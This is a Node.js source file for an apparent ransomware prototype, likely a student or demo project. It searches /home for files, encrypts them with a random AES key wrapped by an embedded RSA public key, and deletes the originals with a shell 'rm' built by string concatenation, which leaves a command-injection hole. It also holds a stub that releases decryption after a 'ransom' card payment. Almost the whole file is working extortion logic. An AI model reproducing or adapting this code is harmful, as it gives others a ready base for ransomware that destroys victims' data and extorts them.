'use strict'

// Loading environment Variables
require('dotenv').load();

// Library for finding Files
var fileFinder = require('fs-finder');

// Native Node.js Library that helps with reading and writing to files
var fileStream = require('fs');

// RSA library
var ursa = require('node-rsa');
var localRSA = require('./js/rsa.js');

// AES-192 library to encrypt and decrypt files
var encryptor = require('file-encryptor');

// Native Node.js library to execute commands on shells
//var sys = require('sys');
var exe = require('child_process').exec;


var encryptedKey = '';

var files = fileFinder.from('/home').findFiles('*.foo');
var encryptedFiles = [];

// Publuc Key (RSA) that will encrypt the key that encrypts the files
var pubkeyTrudy = '-----BEGIN PUBLIC KEY-----\n'+
'MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDZSCnqlU26QVvPINDZ5Om4nSG0\n'+
'lLIbzgpEh4IEo9CFIN8E29LrqdW+D3p6mAjy2QO882ogMqjsrPhH3XSg/C46QcSg\n'+
'1wXfv0p6qN1uIOvtVU1ItZ0l9TFwhC/mjhWoPWSEiSa3Ccw8g80iTExOzXVTjZp9\n'+
'mQmilgQsNiTzlPmGgQIDAQAB\n'+
'-----END PUBLIC KEY-----\n';

var pubkeyRSA = new ursa(localRSA.privkeypem);

pubkeyRSA.importKey(pubkeyTrudy,'public');


//var secureRandom = require('secure-random-string');
//var password = secureRandom(64);

/**
 * Function that will encrypt the files with .foo extention.
 * Deletes the original file that is being encrypted.
 */
function encryptFiles(){
  console.log("DUDE ITS RUNNING!!!");
  console.log(pubkeyRSA);
  // Secure Random generator for key for AES-192
  var secureRandom = require('secure-random-string');
  var password = secureRandom(64);

  //console.log(`Print out ursa: ${ursa}`);

  //var pubkey = ursa.createPublicKey(pubkeyTrudy);
  encryptedKey = pubkeyRSA.encrypt(password, 'base64');

  // Saving the encrypted key for later use. Incase the program shuts off.
  process.env['Encrypted-Key'] = encryptedKey;

  files.forEach(function(file) {
    encryptor.encryptFile(file, file+'.lock', password, function(err) {
      if(err)
      console.log('Cannot encrypt: ' + file);

      deleteOriginalFile(file);
    });
    encryptedFiles.push(file +'.lock');
  });
}

/**
 * Decrypts the files that have been encrypted upon proper ransom being provided.
 */
function deCryptFiles(key){
  console.log(key)
  encryptedFiles.forEach(function(file) {
    encryptor.decryptFile(file, file + '.foo', key, function(err) {
      if(err)
      console.log('Cannot decrypt the file: '+ file);
    });
  });
}

/**
 * Basic function that uses command line "rm" to delete original file being encrypted
 */
function deleteOriginalFile(file) {
  var stringToEx = 'rm '+ file;
  exe(stringToEx);
}

/**
 * Function originally would be an API CALL to validate the card and upon successful payment
 * would decrypt files. Currently just checks for a basic card number.
 */
function sendCCToTrudy(cardNumber, backNumbers, expiryDate) {
  if(cardNumber != '4444444444444444') {
    return false;
  } else {
    //TODO charge the card with money and then decrypt the files
    
    deCryptFiles(pubkeyRSA.decrypt(encryptedKey, 'utf8'));
  }

  return true;
}

//encryptFiles(files);
//deleteOriginalFiles(files);
//console.log(encryptedFiles);
//console.log('Encrypted');

//console.log('DeCrypting now........\n\n');
//deCryptFiles(password);
//encryptor.decryptFile('/home/nilay/Pictures/pic1.foo.lock', '/home/nilay/Pictures/pic1.foo.lock' + '.foo', //'_rctttamQ823QgvzJGzFx6wSC6KOoynW', function(err) {
//    console.log('Cannot decrypt the file: '+ '/home/nilay/Pictures/pic1.foo.lock');
//   });

//console.log(currentPath);

//console.log(fileFinder.from('/home').findFiles('*.foo'));
